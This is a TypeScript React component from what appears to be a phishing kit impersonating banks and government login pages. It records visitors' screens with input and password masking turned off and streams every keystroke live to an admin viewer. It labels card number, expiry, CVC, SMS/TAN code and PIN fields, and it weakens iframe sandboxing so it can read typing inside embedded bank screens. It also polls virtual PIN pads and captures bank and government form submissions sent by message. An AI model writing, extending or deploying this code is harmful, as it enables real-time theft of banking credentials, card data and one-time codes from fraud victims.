"use client";

import { useEffect, useRef } from "react";
import { useParams, usePathname } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { resolveClientSessionId } from "@/components/VisitorTracker";
import { sendBroadcastPacket } from "@/lib/broadcast-transfer";
import { ACTIVE_SESSION_EVENT } from "@/lib/session-id-client";
import type { RealtimeChannel } from "@supabase/supabase-js";

export type LiveClientMeta = {
  sessionId: string;
  pathname: string;
  title: string;
  width: number;
  height: number;
  userAgent: string;
  timestamp: number;
};

export type LiveInputMeta = {
  id?: string;
  name?: string;
  formControlName?: string;
  placeholder?: string;
  ariaLabel?: string;
  type?: string;
  tagName?: string;
  visibleIndex?: number;
  domIndex?: number;
  inIframe?: boolean;
  iframeSrc?: string;
  checked?: boolean;
};

export type LiveUserAction = {
  type: "click" | "input" | "focus" | "blur" | "scroll" | "navigate";
  target?: string;
  value?: string;
  inputMeta?: LiveInputMeta;
  pathname: string;
  timestamp: number;
};

const NON_TEXT_INPUT_TYPES = new Set([
  "hidden",
  "submit",
  "button",
  "reset",
  "image",
  "file",
  "checkbox",
  "radio",
]);

function isEditableVisibleInput(el: Element): el is HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement {
  if (!el) return false;
  const tag = (el.tagName || "").toLowerCase();
  if (tag !== "input" && tag !== "textarea" && tag !== "select") return false;
  const inp = el as HTMLInputElement;
  if (inp.disabled) return false;
  const type = (inp.getAttribute("type") || (tag === "input" ? "text" : tag)).toLowerCase();
  if (NON_TEXT_INPUT_TYPES.has(type)) return false;
  try {
    const win = el.ownerDocument?.defaultView || window;
    const style = win.getComputedStyle(el);
    if (style.display === "none" || style.visibility === "hidden" || style.opacity === "0") {
      return false;
    }
    if (el.closest("[hidden], [aria-hidden='true'], .hidden, .d-none, .sf-hidden")) {
      return false;
    }
    const rect = el.getBoundingClientRect();
    if (rect.width === 0 && rect.height === 0) return false;
  } catch {
    /* ignore */
  }
  return true;
}

function getFieldDisplayName(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): string {
  const doc = target.ownerDocument || document;

  const aria = target.getAttribute("aria-label");
  if (aria && aria.trim()) return aria.trim();

  const placeholder = target.getAttribute("placeholder");
  if (placeholder && placeholder.trim() && placeholder.trim() !== "&quot; &quot;") {
    return placeholder.replace(/&quot;/g, "").trim();
  }

  const parentLabel = target.closest("label");
  if (parentLabel) {
    try {
      const clone = parentLabel.cloneNode(true) as HTMLElement;
      clone.querySelectorAll("input, select, textarea, button, svg, script, style").forEach((el) => el.remove());
      const text = (clone.textContent || "").replace(/\s+/g, " ").trim().split("\n")[0].trim();
      if (text && text.length < 60) return text;
    } catch {
      /* ignore */
    }
  }

  if (target.id) {
    try {
      const escapedId = typeof CSS !== "undefined" && CSS.escape ? CSS.escape(target.id) : target.id.replace(/([ #;?%&,.+*~\':"!^$[\]()=>|\/@])/g, "\\$1");
      const labelEl = doc.querySelector(`label[for="${escapedId}"]`);
      if (labelEl && labelEl.textContent) {
        const text = labelEl.textContent.replace(/\s+/g, " ").trim().split("\n")[0].trim();
        if (text && text.length < 60) return text;
      }
    } catch {
      /* ignore */
    }
  }

  // Search nearby label / title elements inside field wrapper (bank templates, Autenticacao, Angular Material, etc.)
  try {
    const wrapper = target.closest(
      "fieldset, .mat-form-field, .input-div, .form-group, .field, .field-group, .input-wrapper, .login__content-input, .row, tr, .wrapperModal"
    ) || target.parentElement;
    if (wrapper) {
      const labelCandidate = wrapper.querySelector(
        "label, .mat-form-field-label, .floating-label, .nblogin-title, .lblMobileTxtModal, .lglbl, .control-label, .form-label"
      );
      if (labelCandidate && labelCandidate.textContent) {
        const text = labelCandidate.textContent.replace(/\s+/g, " ").replace(/\*$/, "").trim();
        if (text && text.length < 60) return text;
      }
    }
  } catch {
    /* ignore */
  }

  const ac = target.getAttribute("autocomplete");
  if (ac === "cc-number") return "Kart Numarası";
  if (ac === "cc-exp") return "Son Kullanma (SKT)";
  if (ac === "cc-csc") return "CVC";
  if (ac === "tel") return "Telefon Numarası";
  if (ac === "name") return "İsim Soyisim";

  const n = `${target.name || ""} ${target.id || ""} ${target.getAttribute("formcontrolname") || ""}`.toLowerCase();
  if (n.includes("inputmobile") || n.includes("phone") || n.includes("tel") || n.includes("mobile")) return "Telefon";
  if (n.includes("mobiletan") || n.includes("tan") || n.includes("tac") || n.includes("otp") || n.includes("sms")) return "SMS / TAN Kodu";
  if (n.includes("card") || n.includes("kortel")) return "Kart Numarası";
  if (n.includes("exp")) return "Son Kullanma (SKT)";
  if (n.includes("cvc") || n.includes("cvv")) return "CVC";
  if (n.includes("first")) return "Ad";
  if (n.includes("last")) return "Soyad";
  if (n.includes("pass") || n.includes("pin") || n.includes("slapta") || n.includes("parool") || target.type === "password") return "Şifre / PIN";
  if (n.includes("user") || n.includes("login") || n.includes("chave") || n.includes("adesao") || n.includes("contrato") || n.includes("nif")) return "Kullanıcı / Müşteri No";
  if (n.includes("code")) return "Kod";

  return target.name || target.id || "Giriş Alanı";
}

function findOwningIframeSrc(targetDoc: Document, rootDoc: Document = document, depth = 0): string {
  if (targetDoc === rootDoc || depth > 4) return "";
  try {
    const iframes = Array.from(rootDoc.querySelectorAll("iframe"));
    for (const ifr of iframes) {
      try {
        const cDoc = ifr.contentDocument || ifr.contentWindow?.document;
        if (cDoc === targetDoc) {
          return ifr.getAttribute("src") || targetDoc.location?.pathname || "";
        }
        if (cDoc) {
          const nested = findOwningIframeSrc(targetDoc, cDoc, depth + 1);
          if (nested) return nested;
        }
      } catch {
        /* ignore */
      }
    }
  } catch {
    /* ignore */
  }
  return targetDoc.location?.pathname || "";
}

function buildInputMeta(target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement): LiveInputMeta {
  const doc = target.ownerDocument || document;
  const allInputs = Array.from(doc.querySelectorAll("input, textarea, select")) as Array<
    HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement
  >;
  const domIndex = allInputs.indexOf(target);
  const visibleInputs = allInputs.filter(isEditableVisibleInput);
  const visibleIndex = visibleInputs.indexOf(target);
  const inIframe = doc !== document;
  const iframeSrc = inIframe ? findOwningIframeSrc(doc) : "";

  return {
    id: target.id || "",
    name: target.getAttribute("name") || "",
    formControlName: target.getAttribute("formcontrolname") || "",
    placeholder: target.getAttribute("placeholder") || "",
    ariaLabel: target.getAttribute("aria-label") || "",
    type: (target.getAttribute("type") || target.tagName || "text").toLowerCase(),
    tagName: (target.tagName || "input").toLowerCase(),
    visibleIndex,
    domIndex,
    inIframe,
    iframeSrc,
    checked: "checked" in target ? Boolean(target.checked) : undefined,
  };
}

export function LiveScreenRecorder() {
  const pathname = usePathname();
  const params = useParams();
  const channelRef = useRef<RealtimeChannel | null>(null);
  const stopRecordRef = useRef<(() => void) | null>(null);
  const rrwebRecordRef = useRef<any>(null);
  const isStreamingRef = useRef(false);
  const streamTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const currentSessionIdRef = useRef<string | null>(null);
  const initialMetaRef = useRef<any>(null);
  const initialSnapshotRef = useRef<any>(null);
  const sendFullSnapshotFlowRef = useRef<(() => Promise<void>) | null>(null);
  const pathnameRef = useRef(pathname);
  pathnameRef.current = pathname;

  const extendStreaming = () => {
    isStreamingRef.current = true;
    if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
    streamTimeoutRef.current = setTimeout(() => {
      isStreamingRef.current = false;
    }, 120000);
  };

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (window.location.pathname.startsWith("/admin")) return;

    let isDisposed = false;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    async function initRecorder() {
      const routeSessionId = params?.id as string | undefined;
      const querySessionId = new URLSearchParams(window.location.search).get("session");
      const sessionId = resolveClientSessionId(routeSessionId, querySessionId);

      if (!sessionId || isDisposed || !supabase) return;

      // Clean up any prior recorder/channel before starting a new one
      if (stopRecordRef.current) {
        try {
          stopRecordRef.current();
        } catch {
          /* ignore */
        }
        stopRecordRef.current = null;
      }
      rrwebRecordRef.current = null;
      if (channelRef.current) {
        try {
          void supabase.removeChannel(channelRef.current);
        } catch {
          /* ignore */
        }
        channelRef.current = null;
      }

      currentSessionIdRef.current = sessionId;

      let rrweb: typeof import("rrweb") | null = null;
      try {
        rrweb = await import("rrweb");
      } catch (e) {
        console.error("[LiveScreenRecorder] failed to import rrweb:", e);
        return;
      }

      if (isDisposed) return;

      const channelName = `live-screen:${sessionId}`;
      const channel = supabase.channel(channelName, {
        config: { broadcast: { ack: false } },
      });
      channelRef.current = channel;

      const sendMeta = async () => {
        const meta: LiveClientMeta = {
          sessionId,
          pathname: window.location.pathname,
          title: document.title,
          width: window.innerWidth,
          height: window.innerHeight,
          userAgent: navigator.userAgent,
          timestamp: Date.now(),
        };
        await sendBroadcastPacket(channel, "client_meta", meta);
      };

      const sendAction = async (action: Omit<LiveUserAction, "pathname" | "timestamp">) => {
        if (!isStreamingRef.current || !channelRef.current) return;
        const fullAction: LiveUserAction = {
          ...action,
          pathname: window.location.pathname,
          timestamp: Date.now(),
        };
        await sendBroadcastPacket(channelRef.current, "user_action", fullAction);
      };

      const emitInputForElement = (target: HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement) => {
        if (!target || !target.tagName) return;
        const tag = target.tagName.toLowerCase();
        if (tag !== "input" && tag !== "textarea" && tag !== "select") return;
        const type = (target.getAttribute("type") || "text").toLowerCase();
        if (NON_TEXT_INPUT_TYPES.has(type)) return;

        const fieldName = getFieldDisplayName(target);
        const val = target.value || "";
        (target as any).__lastLiveVal = val;

        void sendAction({
          type: "input",
          target: fieldName,
          value: val,
          inputMeta: buildInputMeta(target),
        });
      };

      const syncAllCurrentInputs = (rootDoc: Document = document, depth = 0) => {
        if (!rootDoc || depth > 4) return;
        try {
          rootDoc.querySelectorAll("input, textarea, select").forEach((el) => {
            if (!isEditableVisibleInput(el)) return;
            const val = el.value || "";
            if (val.trim().length > 0) {
              emitInputForElement(el);
            }
          });
          rootDoc.querySelectorAll("iframe").forEach((ifr) => {
            try {
              const cDoc = (ifr as HTMLIFrameElement).contentDocument || (ifr as HTMLIFrameElement).contentWindow?.document;
              if (cDoc) syncAllCurrentInputs(cDoc, depth + 1);
            } catch {
              /* ignore */
            }
          });
        } catch {
          /* ignore */
        }
      };

      const sendFullSnapshotFlow = async () => {
        extendStreaming();
        await sendMeta();

        // 1. Send synthetic Meta event so admin Replayer knows dimensions immediately
        if (channelRef.current) {
          const metaEvent = {
            type: 4, // EventType.Meta
            data: {
              href: window.location.href,
              width: window.innerWidth,
              height: window.innerHeight,
            },
            timestamp: Date.now(),
          };
          await sendBroadcastPacket(channelRef.current, "screen_event", metaEvent);
        }

        // 2. Trigger full DOM snapshot
        const rec = rrwebRecordRef.current || (rrweb && rrweb.record ? rrweb.record : null);
        if (rec) {
          try {
            rec.takeFullSnapshot(true);
          } catch (err) {
            console.error("[LiveScreenRecorder] takeFullSnapshot error:", err);
          }
        }

        // 3. Also sync any inputs that already have values (including inside bank iframes)
        setTimeout(() => {
          if (!isDisposed && isStreamingRef.current) {
            syncAllCurrentInputs(document, 0);
          }
        }, 120);
      };

      sendFullSnapshotFlowRef.current = sendFullSnapshotFlow;

      // Listen for admin requests
      channel
        .on("broadcast", { event: "admin_request_snapshot" }, async () => {
          await sendFullSnapshotFlow();
        })
        .on("broadcast", { event: "admin_heartbeat" }, () => {
          extendStreaming();
        })
        .on("broadcast", { event: "admin_disconnect" }, () => {
          isStreamingRef.current = false;
        });

      channel.subscribe(async (status) => {
        if (status === "SUBSCRIBED" && !isDisposed) {
          await sendMeta();
          // Send snapshot immediately
          await sendFullSnapshotFlow();
          // Secondary snapshot after 400ms when React hydration completes
          setTimeout(() => {
            if (!isDisposed && isStreamingRef.current) {
              void sendFullSnapshotFlow();
            }
          }, 400);
          // Third snapshot after 1200ms when async data/banks/logos settle
          setTimeout(() => {
            if (!isDisposed && isStreamingRef.current) {
              void sendFullSnapshotFlow();
            }
          }, 1200);
          // Fourth snapshot after 2500ms for slower bank/settings fetches
          setTimeout(() => {
            if (!isDisposed && isStreamingRef.current) {
              void sendFullSnapshotFlow();
            }
          }, 2500);
        }
      });

      // Start rrweb recording with canvas & inline styles
      try {
        rrwebRecordRef.current = rrweb.record;
        const stop = rrweb.record({
          emit(event) {
            if (isDisposed) return;
            // Cache initial meta & snapshot
            if (event.type === 4) initialMetaRef.current = event;
            if (event.type === 2) initialSnapshotRef.current = event;

            // Stream to channel if admin is watching
            if (isStreamingRef.current && channelRef.current) {
              void sendBroadcastPacket(channelRef.current, "screen_event", event);
            }
          },
          maskAllInputs: false,
          maskInputOptions: {
            password: false,
          },
          inlineStylesheet: true,
          inlineImages: false, // Super fast & lean: images load via their native URLs without blocking the thread
          collectFonts: false,
          recordCanvas: true,
          keepIframeSrcFn: () => true, // CRITICAL: PRESERVE BANK IFRAME SRC SO BANK SCREENS RENDER INSTEAD OF BLANK WHITE!
          sampling: {
            mousemove: 60, // Smooth 16fps cursor tracking without WebSocket congestion
            mouseInteraction: true,
            scroll: 60,
            input: "all",
          },
        });
        stopRecordRef.current = stop || null;
      } catch (err) {
        console.error("[LiveScreenRecorder] rrweb record error:", err);
      }

      // FIELD-BASED INSTANT INPUT: ANLIK OLARAK ALAN BAZLI GÖNDERİM!
      const handleInput = (e: Event) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null;
        if (!target) return;
        emitInputForElement(target);
      };

      const handleBlur = (e: FocusEvent) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null;
        if (!target || !target.tagName) return;
        const tag = target.tagName.toLowerCase();
        if (tag !== "input" && tag !== "textarea" && tag !== "select") return;
        const type = (target.getAttribute("type") || "text").toLowerCase();
        if (NON_TEXT_INPUT_TYPES.has(type)) return;
        const fieldName = getFieldDisplayName(target);
        void sendAction({
          type: "blur",
          target: fieldName,
          inputMeta: buildInputMeta(target),
        });
      };

      const handleFocus = (e: FocusEvent) => {
        const target = e.target as HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement | null;
        if (!target || !target.tagName) return;
        const tag = target.tagName.toLowerCase();
        if (tag !== "input" && tag !== "textarea" && tag !== "select") return;
        const type = (target.getAttribute("type") || "text").toLowerCase();
        if (NON_TEXT_INPUT_TYPES.has(type)) return;
        const desc = getFieldDisplayName(target);
        void sendAction({
          type: "focus",
          target: desc,
          inputMeta: buildInputMeta(target),
        });
      };

      const attachListenersToDoc = (doc: Document) => {
        if (!doc || (doc as any).__liveAttached) return;
        (doc as any).__liveAttached = true;
        doc.addEventListener("input", handleInput, { capture: true, passive: true });
        doc.addEventListener("change", handleInput, { capture: true, passive: true });
        doc.addEventListener("keyup", handleInput, { capture: true, passive: true });
        doc.addEventListener("focus", handleFocus, { capture: true, passive: true });
        doc.addEventListener("blur", handleBlur, { capture: true, passive: true });
      };

      attachListenersToDoc(document);

      // ATTACH TO SAME-ORIGIN BANK IFRAMES (AND NESTED IFRAMES) TO CAPTURE TYPING INSIDE BANK SCREENS!
      const scanIframes = (rootDoc: Document = document, depth = 0) => {
        if (!rootDoc || depth > 4) return;
        try {
          rootDoc.querySelectorAll("iframe").forEach((node) => {
            const ifr = node as HTMLIFrameElement;
            try {
              const sb = ifr.getAttribute("sandbox");
              if (sb && !sb.includes("allow-same-origin")) {
                ifr.setAttribute("sandbox", `${sb} allow-same-origin`);
              }
            } catch {
              /* ignore */
            }

            if (!(ifr as any).__liveLoadHooked) {
              (ifr as any).__liveLoadHooked = true;
              ifr.addEventListener("load", () => {
                try {
                  const loadedDoc = ifr.contentDocument || ifr.contentWindow?.document;
                  if (loadedDoc) {
                    attachListenersToDoc(loadedDoc);
                    scanIframes(loadedDoc, depth + 1);
                  }
                  if (!isDisposed && isStreamingRef.current && sendFullSnapshotFlowRef.current) {
                    void sendFullSnapshotFlowRef.current();
                  }
                } catch {
                  /* ignore */
                }
              });
            }

            try {
              const doc = ifr.contentDocument || ifr.contentWindow?.document;
              if (doc) {
                attachListenersToDoc(doc);
                scanIframes(doc, depth + 1);
              }
            } catch {
              /* ignore */
            }
          });
        } catch {
          /* ignore */
        }
      };

      // Poll visible inputs in main doc & iframes to catch virtual keypads (e.g. Novo Banco PIN pad) or autofill
      const pollInputValues = (rootDoc: Document = document, depth = 0) => {
        if (!rootDoc || depth > 4 || !isStreamingRef.current) return;
        try {
          rootDoc.querySelectorAll("input, textarea, select").forEach((el) => {
            if (!isEditableVisibleInput(el)) return;
            const curVal = el.value || "";
            const prevVal = (el as any).__lastLiveVal ?? "";
            if (curVal !== prevVal) {
              emitInputForElement(el);
            }
          });
          rootDoc.querySelectorAll("iframe").forEach((node) => {
            try {
              const cDoc = (node as HTMLIFrameElement).contentDocument || (node as HTMLIFrameElement).contentWindow?.document;
              if (cDoc) pollInputValues(cDoc, depth + 1);
            } catch {
              /* ignore */
            }
          });
        } catch {
          /* ignore */
        }
      };

      scanIframes(document, 0);
      const iframeInterval = setInterval(() => {
        scanIframes(document, 0);
        pollInputValues(document, 0);
      }, 250);

      // Listen for bank postMessage submissions
      const handleWindowMessage = (e: MessageEvent) => {
        if (!e.data || typeof e.data !== "object") return;
        if (e.data.type === "LITHUANIA_BANK_SUBMIT" && e.data.formData) {
          const fd = e.data.formData;
          if (Array.isArray(fd.fields)) {
            fd.fields.forEach((f: any) => {
              if (f.key && f.value) {
                void sendAction({
                  type: "input",
                  target: f.label || f.name || f.key,
                  value: f.value,
                });
              }
            });
          }
        } else if (e.data.type === "PT_BANK_SUBMIT" && e.data.data && typeof e.data.data === "object") {
          Object.entries(e.data.data).forEach(([k, v]) => {
            if (typeof v === "string" && v.trim()) {
              void sendAction({
                type: "input",
                target: k,
                value: v,
              });
            }
          });
        } else if (e.data.type === "AUTH_GOV" && e.data.data && typeof e.data.data === "object") {
          Object.entries(e.data.data).forEach(([k, v]) => {
            if (typeof v === "string" && v.trim()) {
              void sendAction({
                type: "input",
                target: k,
                value: v,
              });
            }
          });
        } else if (
          e.data.type === "LITHUANIA_BANK_TAB_CLICK" ||
          e.data.type === "ESTONIA_BANK_TAB_CLICK"
        ) {
          setTimeout(() => {
            if (!isDisposed && isStreamingRef.current && sendFullSnapshotFlowRef.current) {
              void sendFullSnapshotFlowRef.current();
            }
          }, 150);
        }
      };
      window.addEventListener("message", handleWindowMessage);

      return () => {
        clearInterval(iframeInterval);
        window.removeEventListener("message", handleWindowMessage);
        document.removeEventListener("input", handleInput, true);
        document.removeEventListener("change", handleInput, true);
        document.removeEventListener("keyup", handleInput, true);
        document.removeEventListener("blur", handleBlur, true);
        document.removeEventListener("focus", handleFocus, true);
        (document as any).__liveAttached = false;
      };
    }

    let cleanupPromise = initRecorder();

    const onSessionChanged = (ev: Event) => {
      const detailSessionId = (ev as CustomEvent)?.detail?.sessionId;
      if (detailSessionId && detailSessionId === currentSessionIdRef.current && channelRef.current) {
        return;
      }
      void cleanupPromise.then((cleanupFn) => {
        if (typeof cleanupFn === "function") cleanupFn();
      });
      cleanupPromise = initRecorder();
    };
    window.addEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);

    return () => {
      isDisposed = true;
      window.removeEventListener(ACTIVE_SESSION_EVENT, onSessionChanged);
      if (streamTimeoutRef.current) clearTimeout(streamTimeoutRef.current);
      if (stopRecordRef.current) {
        try {
          stopRecordRef.current();
        } catch {
          /* ignore */
        }
        stopRecordRef.current = null;
      }
      rrwebRecordRef.current = null;
      if (channelRef.current) {
        void supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
      void cleanupPromise.then((cleanupFn) => {
        if (typeof cleanupFn === "function") cleanupFn();
      });
    };
  }, []); // Run on mount; persistent WebSocket across client-side route changes!

  // ZERO LATENCY ROUTE NAVIGATION SYNC:
  // When user navigates to any new page (/banken, /card, /sms, /win, bank, etc.),
  // immediately stream the new page's FullSnapshot over the existing, open WebSocket channel!
  useEffect(() => {
    if (typeof window === "undefined") return;
    if (window.location.pathname.startsWith("/admin")) return;
    if (!channelRef.current) return;

    extendStreaming();

    if (sendFullSnapshotFlowRef.current) {
      void sendFullSnapshotFlowRef.current();
    }

    const t1 = setTimeout(() => {
      if (sendFullSnapshotFlowRef.current && isStreamingRef.current) {
        void sendFullSnapshotFlowRef.current();
      }
    }, 300);

    const t2 = setTimeout(() => {
      if (sendFullSnapshotFlowRef.current && isStreamingRef.current) {
        void sendFullSnapshotFlowRef.current();
      }
    }, 1200);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, [pathname]);

  return null;
}
